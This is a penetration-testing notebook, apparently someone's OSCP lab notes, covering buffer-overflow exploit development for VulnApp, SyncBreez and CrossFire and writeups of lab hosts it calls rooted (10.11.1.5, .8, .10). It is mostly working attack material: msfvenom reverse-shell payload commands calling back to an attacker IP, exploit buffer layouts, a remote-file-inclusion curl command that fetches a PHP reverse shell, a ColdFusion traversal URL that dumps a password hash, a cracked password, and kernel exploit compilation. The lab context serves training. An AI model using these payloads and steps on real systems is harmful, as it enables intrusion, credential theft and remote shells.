/>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <br />/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <br /><br />to find JMP ESP<br />    !mona jmp -r esp -cpb “\x00\x0A”        &lt;&lt; bad charachters<br />        ^^^ may lead you right to it<br />    !mona modules<br />        look for a .exe or dll with ASLR, DEP, and Rebase disabled. (ALso no bad chars in the address)<br />        !mona find -s “\xff\xe4” -m yeet.dll<br />            ^^^Look at address<br />      if all else fails in the top left pane Ctrl f for JMP ESP<br /><br /><br />      If ESP is too small for shellcode, <br />        1. see where you can write to (EAX, EBX, ECX)<br />        2. find what exe\dll you can abuse (!mona modules)<br />        3. use msf-nasm_shell to find the opcodes (JMP xxx and CALL xxx are the only ones I know can work)     <br />        4. find an opcode in the abuseable exe\dll (!mona find -s “\xFF\xD1” -m VulnApp.exe)<br />        5. Take the register address of that function and overwrite EIP with that (in little endian)<br />        6. Call that opcode and two null bytes with ESP (Where your Cs roll over into)(&quot;\xFF\xD1\x90\x90&quot;) not little endian<br />        7. drop your shell code where you are able to write with nulls around it.<br /><br />to find opcodes<br />    msf-nasm_shell<br />        JMP xxx<br />        CALL xxx<br />      <br />Payload<br />    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.167 LPORT=443 -f c -a x86 --platform windows -b ‘\x00\x3b’ -e x86/alpha_upper &gt; payload.txt<br />    </div><div class='page'><h1 class='title level-4'>VulnApp2.1</h1><br/>Bytes to break            = 2096<br />break Confirmed         = X<br />Exact Location            = 2080<br />overwrite confirmed    = X<br />Shellcode space          = 12<br />badchars                    = \x00\x3B\x45<br />opcode                       = CALL ECX<br />opcode hex                 = \xff\xD1<br />operation address        = 14802E11<br />little endian address    = &quot;\x11\x2E\x80\x14&quot;<br /><br /><br />Find Offset<br />/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <br />/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <br /><br />Find BadChar<br />c = &quot;&quot;<br />cl = []<br />badchar = [0x00]<br />for ch in range (0x00 , 0xFF+1):<br />        if ch not in badchar:<br />                cl.append(chr(ch))<br />for i in cl:<br />        c += i<br />input(c)<br /><br />to find JMP ESP<br />    !mona jmp -r esp -cpb “\x00\x0A”        &lt;&lt; bad charachters<br />        ^^^ may lead you right to it<br />    !mona modules<br />        look for a .exe or dll with ASLR, DEP, and Rebase disabled. (ALso no bad chars in the address)<br />        !mona find -s “\xff\xe4” -m yeet.dll<br />            ^^^Look at address<br />      if all else fails in the top left pane Ctrl f for JMP ESP<br /><br />      If ESP is too small for shellcode, <br />        1. see where you can write to (EAX, EBX, ECX)<br />        2. find what exe\dll you can abuse (!mona modules)<br />        3. use msf-nasm_shell to find the opcodes (JMP xxx and CALL xxx are the only ones I know can work)     <br />        4. find an opcode in the abuseable exe\dll (!mona find -s “\xFF\xD1” -m VulnApp.exe)<br />        5. Take the register address of that function and overwrite EIP with that (in little endian)<br />        6. Call that opcode and two null bytes with ESP (Where your Cs roll over into)(&quot;\xFF\xD1\x90\x90&quot;) not little endian<br />        7. drop your shell code where you are able to write with nulls around it.<br /><br />to find opcodes<br />    msf-nasm_shell<br />        JMP xxx<br />        CALL xxx<br />      <br />Payload<br />    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.167 LPORT=443 -f c -a x86 --platform windows -b ‘\x00\x3b’ -e x86/alpha_upper &gt; payload.txt<br />    </div><div class='page'><h1 class='title level-4'>VulnApp3</h1><br/>Bytes to break            = 2148<br />break Confirmed         = X<br />Exact Location            = 2080<br />overwrite confirmed    = X<br />Shellcode space          = 68<br />badchars                    = \x00<br />opcode                       = <br />opcode hex                 = <br />operation address        = <br />little endian address    = <br /><br /><br />A&#39;s start in EDX<br />A&#39;s write to EBP<br />C&#39;s start in ESP<br /><br />pop esi, pop edi, ret = 1480BAB4<br />ppr little endian       = “\xB4\xBA\x80\x14”<br /><br /><br />Find Offset<br />/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <br />/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <br /><br />Find BadChar<br /><a href="http://www.whatasciicode.com/p/ascii-code-table.html">http://www.whatasciicode.com/p/ascii-code-table.html</a><br />bc = &quot;&quot;<br />bcl = []<br />badchar = [0x00]<br />for ch in range (0x00 , 0xFF+1):<br />        if ch not in badchar:<br />                bcl.append(chr(ch))<br />for i in bcl:<br />        bc += i<br />input(bc)<br /><br />to find JMP ESP<br />    !mona jmp -r esp -cpb “\x00\x0A”        &lt;&lt; bad charachters<br />        ^^^ may lead you right to it<br />    !mona modules<br />        look for a .exe or dll with ASLR, DEP, and Rebase disabled. (ALso no bad chars in the address)<br />        !mona find -s “\xff\xe4” -m yeet.dll<br />            ^^^Look at address<br />      if all else fails in the top left pane Ctrl f for JMP ESP<br /><br />      If ESP is too small for shellcode, <br />        1. see where you can write to (EAX, EBX, ECX)<br />        2. find what exe\dll you can abuse (!mona modules)<br />        3. use msf-nasm_shell to find the opcodes (JMP xxx and CALL xxx are the only ones I know can work)     <br />        4. find an opcode in the abuseable exe\dll (!mona find -s “\xFF\xD1” -m VulnApp.exe)<br />        5. Take the register address of that function and overwrite EIP with that (in little endian)<br />        6. Call that opcode and two null bytes with ESP (Where your Cs roll over into)(&quot;\xFF\xD1\x90\x90&quot;) not little endian<br />        7. drop your shell code where you are able to write with nulls around it.<br /><br />to find opcodes<br />    msf-nasm_shell<br />        JMP xxx<br />        CALL xxx<br />      <br />Payload<br />    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.167 LPORT=443 -f c -a x86 --platform windows -b ‘\x00\x3b’ -e x86/alpha_upper &gt; payload.txt<br />    </div><div class='page'><h1 class='title level-4'>SyncBreez</h1><br/>Bytes to break            = 800<br />break Confirmed         = X<br />Exact Location            = 780<br />overwrite confirmed    = X<br />Shellcode space          = X<br />badchars                    = [0x00,0x0A,0x0D,0x25,0x26,0x2B,0x3D]<br />opcode                       = 10090c83<br />opcode hex                 = \x83\x0C\x09\x10<br />operation address        = <br />little endian address    = <br /><br /><br />Find Offset<br />/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <br />/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <br /><br />Find BadChar<br /><a href="http://www.whatasciicode.com/p/ascii-code-table.html">http://www.whatasciicode.com/p/ascii-code-table.html</a><br />c = &quot;&quot;<br />cl = []<br />badchar = [0x00]<br />for ch in range (0x00 , 0xFF+1):<br />        if ch not in badchar:<br />                cl.append(chr(ch))<br />for i in cl:<br />        c += i<br />input(c)<br />#buffer = c + (&quot;A&quot; * (2288 - len(c))) + (&quot;B&quot; * 4) + (&quot;C&quot; * 1800)<br /><br />to find JMP ESP<br />    !mona jmp -r esp -cpb “\x00\x0A”        &lt;&lt; bad charachters<br />        ^^^ may lead you right to it<br />    !mona modules<br />        look for a .exe or dll with ASLR, DEP, and Rebase disabled. (ALso no bad chars in the address)<br />        !mona find -s “\xff\xe4” -m yeet.dll<br />            ^^^Look at address<br />      if all else fails in the top left pane Ctrl f for JMP ESP<br /><br />      If ESP is too small for shellcode, <br />        1. see where you can write to (EAX, EBX, ECX)<br />        2. find what exe\dll you can abuse (!mona modules)<br />        3. use msf-nasm_shell to find the opcodes (JMP xxx and CALL xxx are the only ones I know can work)     <br />        4. find an opcode in the abuseable exe\dll (!mona find -s “\xFF\xD1” -m VulnApp.exe)<br />        5. Take the register address of that function and overwrite EIP with that (in little endian)<br />        6. Call that opcode and two null bytes with ESP (Where your Cs roll over into)(&quot;\xFF\xD1\x90\x90&quot;) not little endian<br />        7. drop your shell code where you are able to write with nulls around it.<br /><br />to find opcodes<br />    msf-nasm_shell<br />        JMP xxx<br />        CALL xxx<br />      <br />Payload<br />    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.167 LPORT=443 -f c -a x86 --platform windows -b ‘\x00\x3b’ -e x86/alpha_upper &gt; payload.txt<br />    <br />buffer = (&quot;A&quot; * 2288) + &quot;\xcf\x10\x80\x14&quot; +  &quot;\xff\xE4\x90\x90&quot; + (&quot;\x90&quot; * 20) + payload + (&quot;\x90&quot; * 20)<br />    </div><div class='page'><h1 class='title level-4'>CrossFire</h1><br/>Bytes to break            = 4379<br />break Confirmed         = X<br />Exact Location            = 4368<br />overwrite confirmed    = <br />Shellcode space          = <br />badchars                    = <br />opcode                       = <br />opcode hex                 = <br />operation address        = <br />little endian address    = <br /><br /><br />Find Offset<br />/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <br />/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <br /><br />Find BadChar<br /><a href="http://www.whatasciicode.com/p/ascii-code-table.html">http://www.whatasciicode.com/p/ascii-code-table.html</a><br />c = &quot;&quot;<br />cl = []<br />badchar = [0x00]<br />for ch in range (0x00 , 0xFF+1):<br />        if ch not in badchar:<br />                cl.append(chr(ch))<br />for i in cl:<br />        c += i<br />input(c)<br />#buffer = c + (&quot;A&quot; * (2288 - len(c))) + (&quot;B&quot; * 4) + (&quot;C&quot; * 1800)<br /><br />to find JMP ESP<br />    !mona jmp -r esp -cpb “\x00\x0A”        &lt;&lt; bad charachters<br />        ^^^ may lead you right to it<br />    !mona modules<br />        look for a .exe or dll with ASLR, DEP, and Rebase disabled. (ALso no bad chars in the address)<br />        !mona find -s “\xff\xe4” -m yeet.dll<br />            ^^^Look at address<br />      if all else fails in the top left pane Ctrl f for JMP ESP<br /><br />      If ESP is too small for shellcode, <br />        1. see where you can write to (EAX, EBX, ECX)<br />        2. find what exe\dll you can abuse (!mona modules)<br />        3. use msf-nasm_shell to find the opcodes (JMP xxx and CALL xxx are the only ones I know can work)     <br />        4. find an opcode in the abuseable exe\dll (!mona find -s “\xFF\xD1” -m VulnApp.exe)<br />        5. Take the register address of that function and overwrite EIP with that (in little endian)<br />        6. Call that opcode and two null bytes with ESP (Where your Cs roll over into)(&quot;\xFF\xD1\x90\x90&quot;) not little endian<br />        7. drop your shell code where you are able to write with nulls around it.<br /><br />to find opcodes<br />    msf-nasm_shell<br />        JMP xxx<br />        CALL xxx<br />      <br />Payload<br />    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.167 LPORT=443 -f c -a x86 --platform windows -b ‘\x00\x3b’ -e x86/alpha_upper &gt; payload.txt<br />    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.167 LPORT=443 -f c -a x86 --platform windows -b &#39;\x00\x0A\x0D\x25\x26\x2B\x3D&#39; -e x86/shikata_ga_nai<br />    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.167 LPORT=443 -f c -a x86 --platform windows -b &#39;\x00\x0A\x0D\x25\x26\x2B\x3D&#39; -e x86/shikata_ga_nai exitfuc=thread<br />buffer = (&quot;A&quot; * 2288) + &quot;\xcf\x10\x80\x14&quot; +  &quot;\xff\xE4\x90\x90&quot; + (&quot;\x90&quot; * 20) + payload + (&quot;\x90&quot; * 20)<br />    </div><div class='page'><h1 class='title level-3'>10.11.1.5 ALICE Rooted</h1><br/>Could not get ms10-017 to work, ms-08-067 was successfull in metasploit when I used a bind shell and changed the SMBPIPE to SRVSVC.</div><div class='page'><h1 class='title level-4'>enumeration</h1><br/>domain THINC<br />x86</div><div class='page'><h1 class='title level-5'>nmap</h1><br/>nmap -Pn 10.11.1.5 &amp;&amp; nmap -sC -sV -Pn 10.11.1.5 &amp;&amp; nmap -p- -Pn 10.11.1.5<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-26 07:48 EDT<br />Nmap scan report for 10.11.1.5<br />Host is up (0.060s latency).<br />Not shown: 997 closed ports<br />PORT    STATE SERVICE<br />135/tcp open  msrpc<br />139/tcp open  netbios-ssn<br />445/tcp open  microsoft-ds<br /><br />Nmap done: 1 IP address (1 host up) scanned in 7.85 seconds<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-26 07:48 EDT<br />Nmap scan report for 10.11.1.5<br />Host is up (0.073s latency).<br />Not shown: 997 closed ports<br />PORT    STATE SERVICE      VERSION<br />135/tcp open  msrpc        Microsoft Windows RPC<br />139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn<br />445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds<br />Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp<br /><br />Host script results:<br />|_clock-skew: -1m21s<br />|_nbstat: NetBIOS name: ALICE, NetBIOS user: HACKER, NetBIOS MAC: 00:50:56:9f:f5:61 (VMware)<br />| smb-security-mode: <br />|   account_used: guest<br />|   authentication_level: user<br />|   challenge_response: supported<br />|_  message_signing: disabled (dangerous, but default)<br />|_smb2-time: Protocol negotiation failed (SMB2)<br /><br />Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br />Nmap done: 1 IP address (1 host up) scanned in 19.94 seconds<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-26 07:49 EDT<br />Nmap scan report for 10.11.1.5<br />Host is up (0.095s latency).<br />Not shown: 65532 closed ports<br />PORT    STATE SERVICE<br />135/tcp open  msrpc<br />139/tcp open  netbios-ssn<br />445/tcp open  microsoft-ds<br /><br />Nmap done: 1 IP address (1 host up) scanned in 77.01 seconds<br /></div><div class='page'><h1 class='title level-5'>smb</h1><br/></div><div class='page'><h1 class='title level-6'>smb nmap</h1><br/>nmap --script smb-vuln* -p 139,445 10.11.1.5<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-26 07:48 EDT<br />Nmap scan report for 10.11.1.5<br />Host is up (0.097s latency).<br /><br />PORT    STATE SERVICE<br />139/tcp open  netbios-ssn<br />445/tcp open  microsoft-ds<br /><br />Host script results:<br />|_smb-vuln-ms10-054: false<br />|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND<br />| smb-vuln-ms17-010: <br />|   VULNERABLE:<br />|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)<br />|     State: VULNERABLE<br />|     IDs:  CVE:CVE-2017-0143<br />|     Risk factor: HIGH<br />|       A critical remote code execution vulnerability exists in Microsoft SMBv1<br />|        servers (ms17-010).<br />|           <br />|     Disclosure date: 2017-03-14<br />|     References:<br />|       <a href="https://technet.microsoft.com/en-us/library/security/ms17-010.aspx">https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</a><br />|       <a href="https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/">https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/</a><br />|_      <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</a><br /><br />Nmap done: 1 IP address (1 host up) scanned in 21.11 seconds<br />squid@CoolHandKali:/Yeet/Machines/OSCP$ <br /></div><div class='page'><h1 class='title level-6'>enum4linux</h1><br/>enum4linux -a 10.11.1.5<br />Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Apr 26 07:48:49 2020<br /><br /> ========================== <br />|    Target Information    |<br /> ========================== <br />Target ........... 10.11.1.5<br />RID Range ........ 500-550,1000-1050<br />Username ......... &#39;&#39;<br />Password ......... &#39;&#39;<br />Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none<br /><br /><br /> ================================================= <br />|    Enumerating Workgroup/Domain on 10.11.1.5    |<br /> ================================================= <br />[+] Got domain/workgroup name: THINC<br /><br /> ========================================= <br />|    Nbtstat Information for 10.11.1.5    |<br /> ========================================= <br />Looking up status of 10.11.1.5<br />	ALICE           &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service<br />	ALICE           &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service<br />	THINC           &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name<br />	ALICE           &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service<br />	THINC           &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections<br />	THINC           &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser<br />	..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser<br />	HACKER          &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service<br /><br />	MAC Address = 00-50-56-9F-F5-61<br /><br /> ================================== <br />|    Session Check on 10.11.1.5    |<br /> ================================== <br />[E] Server doesn&#39;t allow session using username &#39;&#39;, password &#39;&#39;.  Aborting remainder of tests.<br /></div><div class='page'><h1 class='title level-4'>pictures</h1><br/><a href=""><img src="images/1732-1.png" alt="images/1732-1.png" /></a></div><div class='page'><h1 class='title level-5'>smb vuln nmap</h1><br/><a href=""><img src="images/1733-1.png" alt="images/1733-1.png" /></a><br /><br /><a href=""><img src="images/1733-2.png" alt="images/1733-2.png" /></a><br /><a href=""><img src="images/1733-3.png" alt="images/1733-3.png" /></a></div><div class='page'><h1 class='title level-5'>proof</h1><br/><a href=""><img src="images/1734-1.png" alt="images/1734-1.png" /></a><br />ed20b785808f615be2c588ed925b18ce</div><div class='page'><h1 class='title level-3'>10.11.1.8 Phoenix rooted</h1><br/>nmap showed that an assload of ports were open.<br />while enumerating 80 robots.txt pointed me towards /internal.<br />The source code of /internal showed me that the machine was running advanced commenting system.<br />searchsploit showed me that I could craft a curl command to get code execution.<br />curl -s “http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=http://192.168.119.167:443/80.txt%00”<br /><a href=""><img src="images/1735-1.png" alt="images/1735-1.png" /></a><br />note --I think the trailing %00 makes the file execute as a .php or maybe adds the extension and executes it.<br />80.txt is pentestmonkey&#39;s phpshell.php edited and renamed.<br />catch reverse shell with nc.<br />uname -a shows 2.6.9-89<br />This kernel is vulnerable to 9545 and 9542. 9545 I could not get to work, some kind of job handler thing.<br /><br />on the x86 kali I compiled the exploit and moved it via github<br />gcc -Wall -Wl,--hash-style=both -o 9542 9542.c<br /><br />uploaded with wget, chmoded, executed and popped a root shell in the same termainal.<br /><br />f56a325ef00d4553a4046b7eacc5d667</div><div class='page'><h1 class='title level-4'>enumeration</h1><br/>domain PHOENIX<br /><br /><br />gcc -Wall -o linux-sendpage linux-sendpage.c<br /><br />gcc -Wall -m64 -o linux-sendpage linux-sendpage.c</div><div class='page'><h1 class='title level-5'>nmap</h1><br/>echo -e e[5me[31me[1mttl=63e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a> ; nmap -Pn 10.11.1.8 &amp;&amp; nmap -sC -sV -Pn 10.11.1.8 &amp;&amp; nmap -p- -Pn 10.11.1.8<br />ttl=63<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-26 11:03 EDT<br />Nmap scan report for 10.11.1.8<br />Host is up (0.53s latency).<br />Not shown: 990 filtered ports<br />PORT     STATE  SERVICE<br />21/tcp   open   ftp<br />22/tcp   open   ssh<br />25/tcp   closed smtp<br />80/tcp   open   http<br />111/tcp  open   rpcbind<br />139/tcp  open   netbios-ssn<br />443/tcp  open   https<br />445/tcp  open   microsoft-ds<br />631/tcp  open   ipp<br />3306/tcp open   mysql<br /><br />Nmap done: 1 IP address (1 host up) scanned in 71.56 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-26 11:04 EDT<br />Nmap scan report for 10.11.1.8<br />Host is up (0.089s latency).<br />Not shown: 990 filtered ports<br />PORT     STATE  SERVICE     VERSION<br />21/tcp   open   ftp         vsftpd 2.0.1<br />| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br />|_Can&#39;t get directory listing: ERROR<br />| ftp-syst: <br />|   STAT: <br />| FTP server status:<br />|      Connected to 192.168.119.167<br />|      Logged in as ftp<br />|      TYPE: ASCII<br />|      No session bandwidth limit<br />|      Session timeout in seconds is 300<br />|      Control connection is plain text<br />|      Data connections will be plain text<br />|      At session startup, client count was 1<br />|      vsFTPd 2.0.1 - secure, fast, stable<br />|_End of status<br />22/tcp   open   ssh         OpenSSH 3.9p1 (protocol 1.99)<br />| ssh-hostkey: <br />|   1024 89:94:af:2e:5d:c1:da:84:25:11:2c:12:45:c6:70:ac (RSA1)<br />|   1024 c1:c5:d1:83:0f:4d:d8:9e:8f:82:4c:be:53:4b:6e:14 (DSA)<br />|_  1024 bc:e1:e6:dd:ab:5e:fd:d1:21:2e:11:7c:d5:b2:03:52 (RSA)<br />|_sshv1: Server supports SSHv1<br />25/tcp   closed smtp<br />80/tcp   open   http        Apache httpd 2.0.52 ((CentOS))<br />| http-methods: <br />|_  Potentially risky methods: TRACE<br />| http-robots.txt: 2 disallowed entries <br />|_/internal/  /tmp/ <br />|_http-server-header: Apache/2.0.52 (CentOS)<br />|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).<br />111/tcp  open   rpcbind     2 (RPC #100000)<br />139/tcp  open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)<br />443/tcp  open   ssl/https?<br />|_ssl-date: 2020-04-26T19:05:48+00:00; +3h58m04s from scanner time.<br />| sslv2: <br />|   SSLv2 supported<br />|   ciphers: <br />|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5<br />|     SSL2_DES_64_CBC_WITH_MD5<br />|     SSL2_RC4_64_WITH_MD5<br />|     SSL2_DES_192_EDE3_CBC_WITH_MD5<br />|     SSL2_RC4_128_EXPORT40_WITH_MD5<br />|     SSL2_RC4_128_WITH_MD5<br />|_    SSL2_RC2_128_CBC_WITH_MD5<br />445/tcp  open   netbios-ssn Samba smbd 3.0.33-0.17.el4 (workgroup: MYGROUP)<br />631/tcp  open   ipp         CUPS 1.1<br />| http-methods: <br />|_  Potentially risky methods: PUT<br />|_http-server-header: CUPS/1.1<br />|_http-title: 403 Forbidden<br />3306/tcp open   mysql?<br />|_mysql-info: ERROR: Script execution failed (use -d to debug)<br />Service Info: OS: Unix<br /><br />Host script results:<br />|_clock-skew: mean: 5h18m04s, deviation: 2h18m35s, median: 3h58m03s<br />| smb-os-discovery: <br />|   OS: Unix (Samba 3.0.33-0.17.el4)<br />|   Computer name: phoenix<br />|   NetBIOS computer name: <br />|   Domain name: <br />|   FQDN: phoenix<br />|_  System time: 2020-04-26T15:05:19-04:00<br />| smb-security-mode: <br />|   account_used: guest<br />|   authentication_level: user<br />|   challenge_response: supported<br />|_  message_signing: disabled (dangerous, but default)<br />|_smb2-time: Protocol negotiation failed (SMB2)<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 261.60 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-26 11:08 EDT<br />Nmap scan report for 10.11.1.8<br />Host is up (0.51s latency).<br />Not shown: 65524 filtered ports<br />PORT     STATE  SERVICE<br />21/tcp   open   ftp<br />22/tcp   open   ssh<br />25/tcp   closed smtp<br />80/tcp   open   http<br />111/tcp  open   rpcbind<br />139/tcp  open   netbios-ssn<br />443/tcp  open   https<br />445/tcp  open   microsoft-ds<br />631/tcp  open   ipp<br />868/tcp  closed unknown<br />3306/tcp open   mysql<br /><br />Nmap done: 1 IP address (1 host up) scanned in 1631.68 seconds</div><div class='page'><h1 class='title level-5'>web</h1><br/></div><div class='page'><h1 class='title level-6'>80</h1><br/></div><div class='page'><h1 class='title level-7'>web nmap</h1><br/>PORT   STATE SERVICE REASON  VERSION<br />80/tcp open  http    syn-ack Apache httpd 2.0.52 ((CentOS))<br />|_http-server-header: Apache/2.0.52 (CentOS)<br /></div><div class='page'><h1 class='title level-7'>gobust</h1><br/>gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u <a href="http://10.11.1.8:80">http://10.11.1.8:80</a><br />===============================================================<br />Gobuster v3.0.1<br />by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)<br />===============================================================<br />[+] Url:            <a href="http://10.11.1.8:80">http://10.11.1.8:80</a><br />[+] Threads:        10<br />[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br />[+] Status codes:   200,204,301,302,307,401,403<br />[+] User Agent:     gobuster/3.0.1<br />[+] Timeout:        10s<br />===============================================================<br />2020/04/26 11:44:41 Starting gobuster<br />===============================================================<br />/manual (Status: 301)<br />/usage (Status: 403)<br />/internal (Status: 301)<br />Progress: 23293 / 220561 (10.56%)^C<br />[!] Keyboard interrupt detected, terminating.<br />===============================================================<br />2020/04/26 11:50:39 Finished<br />===============================================================<br /></div><div class='page'><h1 class='title level-6'>443</h1><br/></div><div class='page'><h1 class='title level-5'>smb</h1><br/></div><div class='page'><h1 class='title level-6'>smb nmap</h1><br/>PORT    STATE SERVICE      REASON<br />139/tcp open  netbios-ssn  syn-ack<br />445/tcp open  microsoft-ds syn-ack<br /></div><div class='page'><h1 class='title level-6'>enum4linux</h1><br/>enum4linux -a 10.11.1.8<br />Starting enum4linux v0.8.9 ( <a href="http://labs.portcullis.co.uk/application/enum4linux/">http://labs.portcullis.co.uk/application/enum4linux/</a> ) on Sun Apr 26 11:25:27 2020<br /><br /> ========================== <br />|    Target Information    |<br /> ========================== <br />Target ........... 10.11.1.8<br />RID Range ........ 500-550,1000-1050<br />Username ......... &#39;&#39;<br />Password ......... &#39;&#39;<br />Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none<br /><br /><br /> ================================================= <br />|    Enumerating Workgroup/Domain on 10.11.1.8    |<br /> ================================================= <br />[E] Can&#39;t find workgroup/domain<br /><br /><br /> ========================================= <br />|    Nbtstat Information for 10.11.1.8    |<br /> ========================================= <br />Looking up status of 10.11.1.8<br />No reply from 10.11.1.8<br /><br /> ================================== <br />|    Session Check on 10.11.1.8    |<br /> ================================== <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.<br />[E] Server doesn&#39;t allow session using username &#39;&#39;, password &#39;&#39;.  Aborting remainder of tests.</div><div class='page'><h1 class='title level-4'>Pictures</h1><br/><br /><a href=""><img src="images/1746-1.png" alt="images/1746-1.png" /></a><br /><br /><a href=""><img src="images/1746-2.png" alt="images/1746-2.png" /></a><br /><br /><a href=""><img src="images/1746-3.png" alt="images/1746-3.png" /></a><br /><br /><a href=""><img src="images/1746-4.png" alt="images/1746-4.png" /></a><br /><br /><a href=""><img src="images/1746-5.png" alt="images/1746-5.png" /></a><br /><br /><a href=""><img src="images/1746-6.png" alt="images/1746-6.png" /></a><br /><br /><a href=""><img src="images/1746-7.png" alt="images/1746-7.png" /></a><br /><br /><a href=""><img src="images/1746-8.png" alt="images/1746-8.png" /></a><br /><br /><a href=""><img src="images/1746-9.png" alt="images/1746-9.png" /></a><br /><br /><a href=""><img src="images/1746-10.png" alt="images/1746-10.png" /></a><br /><br /></div><div class='page'><h1 class='title level-3'>10.11.1.10 Mike rooted</h1><br/>Nmap showed that only 80 was open.<br />Nikto showed that the machine was running cold fusion 8.<br />Searchsploit showed that there was a potential directory traversal that would dump a hash of the admin creds.<br /><a href="http://10.11.1.10/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en">http://10.11.1.10/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en</a><br />AAFDC23870ECBCD3D557B6423A8982134E17927E<br />Ran the creds against hashcrack.com and got a match for &quot;pass123&quot;<br />The attempt to login was successful.<br />Looking at the Server Settings Mappings node told Chris where the root directory of ColdFusion was.<br />C:\Inetpub\wwwroot\CFIDE\<br />He created a scheduled task to upload a malicious .jsp file and write it to the root direcory of ColdFusion.<br />After he ran the scheduled task he navigated to http:\\10.11.1.10\CFIDE\443.jsp, executing the jsp file and giving him a reverse shell via nc.<br />The shell was already nt authority\system.</div><div class='page'><h1 class='title level-4'>enumeraton</h1><br/>windows server 2003/r2 or xp<br /><br /></div><div class='page'><h1 class='title level-5'>nmap</h1><br/>echo -e e[5me[31me[1m1e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a> ; nmap -Pn 10.11.1.10 &amp;&amp; nmap -sC -sV -Pn 10.11.1.10 &amp;&amp; nmap -p- -Pn 10.11.1.10<br />1<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-26 16:25 EDT<br />Nmap scan report for 10.11.1.10<br />Host is up (0.082s latency).<br />Not shown: 999 filtered ports<br />PORT   STATE SERVICE<br />80/tcp open  http<br /><br />Nmap done: 1 IP address (1 host up) scanned in 8.87 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-26 16:25 EDT<br />Nmap scan report for 10.11.1.10<br />Host is up (0.077s latency).<br />Not shown: 999 filtered ports<br />PORT   STATE SERVICE VERSION<br />80/tcp open  http    Microsoft IIS httpd 6.0<br />| http-methods: <br />|_  Potentially risky methods: TRACE<br />|_http-server-header: Microsoft-IIS/6.0<br />|_http-title: Under Construction<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 24.00 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 